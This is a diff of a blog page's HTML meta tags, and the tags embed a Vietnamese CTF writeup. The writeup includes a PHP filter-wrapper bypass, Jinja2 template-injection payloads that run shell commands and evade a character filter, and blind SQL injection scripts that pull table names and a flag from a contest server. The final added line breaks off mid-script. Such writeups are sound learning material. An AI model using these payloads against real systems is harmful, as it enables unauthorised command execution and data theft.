@@ -32,8 +32,8 @@
 <meta name="generator" content="Jekyll v4.3.3" />
 <meta property="og:title" content="Wannagame Freshman CTF writeup" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
-<meta property="og:description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
+<meta name="description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
+<meta property="og:description" content="WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: 